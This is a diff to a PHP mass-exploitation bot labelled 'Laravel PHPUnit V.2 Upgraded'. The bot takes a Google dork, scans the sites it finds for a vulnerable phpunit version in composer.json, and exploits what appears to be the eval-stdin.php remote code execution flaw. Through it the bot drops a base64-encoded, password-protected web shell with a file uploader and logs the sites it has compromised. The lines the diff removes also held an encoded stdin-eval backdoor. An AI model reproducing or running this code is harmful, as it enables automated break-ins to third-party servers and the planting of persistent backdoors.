@@ -26,10 +26,14 @@ Laravel PHPUnit V.2 Upgraded \n";
     }
 
     private function urlSorter($url) {
-        preg_match_all("#(.*?)\/vendor/#i", $url, $o);
-        
+        unset($o);
+        if(strpos($url, "vendor")) preg_match_all("#(.*?)\/vendor/#i", $url, $o);
+        elseif(strpos($url, "tests")) preg_match_all("#(.*?)\/tests/#i", $url, $o);
+        elseif(strpos($url, "app")) preg_match_all("#(.*?)\/app/#i", $url, $o);
+        else $o = null;
+
         $path = pathinfo($url);
-        return count($o)[1] > 0 ? $o."/vendor" : $path['dirname']."/vendor";
+        return $o != null ? $o[1][0]."/vendor" : $path['dirname']."/vendor";
     }
 
     private function dataScrap($url, $header, $post, $reff, $transfer, $result) {
@@ -51,8 +55,8 @@ Laravel PHPUnit V.2 Upgraded \n";
         $reff != null ? curl_setopt($ch, CURLOPT_REFERER, $reff) : curl_setopt($ch, CURLOPT_AUTOREFERER, true);
 
         curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,0);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 120);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,20);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
         
 		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 		curl_setopt($ch, CURLOPT_RETURNTRANSFER, $transfer);
@@ -95,19 +99,23 @@ Laravel PHPUnit V.2 Upgraded \n";
                 foreach($data as $url) {
                     $url = $this->urlSorter(html_entity_decode($url));
                     echo "[ - ] Target : [ $url ]\n";
-
+                    
                     if(!in_array($url, $hasScanned)) {
                         $hasScanned[] = $url;
                         
-                        $getVersion = $this->dataScrap(dirname($url), true, null, null, true, true);
-                        $versionToJson = json_decode($getVersion);
-                        $versionCheck = str_replace(['~','^','.','*','>','<','='],'' , $versionToJson['require-dev']['phpunit/phpunit']);
-                        if(isset($versionCheck) && !empty($versionCheck)) {
-                            $version = $versionToJson['require-dev']['phpunit/phpunit'];
+                        $getVersion = $this->dataScrap(dirname($url)."/composer.json", false, null, null, true, true);
+                        $versionToJson = json_decode($getVersion, 1);
 
+                        if(!isset($versionToJson['require-dev'])) {
+                            echo "[ - ] Status : [ NOT VULN ]\n";
+                            sleep(1);
+                            continue;
+                        }
+                        $versionCheck = str_replace(['~','^','.','*','>','<','='],'' , $versionToJson['require-dev']['phpunit/phpunit']);
+                        if(isset($versionCheck) && !empty($versionCheck) && $versionToJson['require-dev']['phpunit/phpunit'] == "^7.5") {
+                            $version = $versionToJson['require-dev']['phpunit/phpunit'];
                             $payload = 'PD9waHAKc2Vzc2lvbl9zdGFydCgpOwpAaW5pX3NldCgnb3V0cHV0X2J1ZmZlcmluZycsIDApOwpAaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAwKTsKc2V0X3RpbWVfbGltaXQoMCk7CmluaV9zZXQoJ21lbW9yeV9saW1pdCcsICc2NE0nKTsKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwppZihpc3NldCgkX1NFU1NJT05bJ3VzZXInXSkgYW5kICFlbXB0eSgkX1NFU1NJT05bJ3VzZXInXSkpewplY2hvIHBocF91bmFtZSgpOwplY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBuYW1lPSJ1cGxvYWRlciIgaWQ9InVwbG9hZGVyIj4nOwplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKaWYgKCRfUE9TVFsnX3VwbCddID09ICJVcGxvYWQiKSB7CiAgICBpZiAoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSkpIHsKICAgICAgICBlY2hvICdVcGxvYWQgb2sgOkQgISEhJzsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAnVXBsb2FkIEZhaWwgISEhJzsKICAgIH0KfQp9ZWxzZXsKZWNobyAnPGNlbnRlcj4nOwplY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4nOwplY2hvICc8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlciIgc2l6ZT0iNTAiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9Il9sb2dpbiIgaWQ9Il9sb2dpbiIgdmFsdWU9IkxPR0lOIj48L2Zvcm0+JzsKfQppZigkX1BPU1RbJ19sb2dpbiddID09ICJMT0dJTiIgYW5kIG1kNSgkX1BPU1RbInVzZXIiXSk9PSAnOTU3MmI4YWZlYWM2NmIyZGU2YmU4OWVmZjBjMGQ5N2MnKSB7CiRfU0VTU0lPTlsndXNlciddPSdONDVIVCc7Cn0='; 
-                            $body = '<?php echo("PETR03X_WAS_HERE");fwrite(fopen("'.$this->shell_name.'","w"),base64_decode("'.base64_encode(str_replace('9572b8afeac66b2de6be89eff0c0d97c',md5(SHELL_PASSWORD),base64_decode($payload))).'")); ?>';
-                            $delete = '<?php fwrite(fopen("eval-stdin.php","w"),base64_decode("PD9waHAgaWYobWQ1KCRfR0VUWyd1c2VyJ10pPT0nOTM2YTM1ZDFmMzE5OTJlZGQ2YzJkMWQ3MjVkYmVkOGMnKXtldmFsKCc/PicgLiBmaWxlX2dldF9jb250ZW50cygncGhwOi8vc3RkaW4nKSk7fT8+"));?>'; 
+                            $body = '<?php echo("PETR03X_WAS_HERE");fwrite(fopen("'.SHELL_NAME.'","w"),base64_decode("'.base64_encode(str_replace('9572b8afeac66b2de6be89eff0c0d97c',md5(SHELL_PASSWORD),base64_decode($payload))).'")); ?>';
                             
                             $checkCode = $this->dataScrap($url.PATH, true, null, null, true, false);
                             echo "[ - ] Respon : [ $checkCode ]\n";
@@ -124,12 +132,14 @@ Laravel PHPUnit V.2 Upgraded \n";
                                     $uploadShell = $this->dataScrap($url.PATH_UPLOAD.SHELL_NAME, true, null, null, false, false);
                                     if($uploadShell == "200") {
                                         echo "[ - ] Status : [ SUCCESS EXPLOIT ]\n";
-                                        fwrite($file, $url.PATH_UPLOAD.SHELL_NAME);
+                                        fwrite($file, $url.PATH_UPLOAD.SHELL_NAME." [SUCCESS] \n");
+                                        fclose($file);
                                         sleep(1);
                                         continue;
                                     } else {
                                         echo "[ - ] Status : [ FAILED EXPLOIT ]\n";
-                                        fwrite($file, $url.PATH_UPLOAD.SHELL_NAME);
+                                        fwrite($file, $url.PATH_UPLOAD.SHELL_NAME." [FAIL] \n");
+                                        fclose($file);
                                         sleep(1);
                                         continue;
                                     }
@@ -165,5 +175,5 @@ Laravel PHPUnit V.2 Upgraded \n";
 $botInitialize = new PHPUnit();
 
 
-if(!empty($argv[1])) $botInitialize->startBot($argv[1]); 
+if(!empty($argv[1])) $botInitialize->startBot(urlencode($argv[1])); 
 else echo "\n\nUsage: $argv[0] dork_google\n";
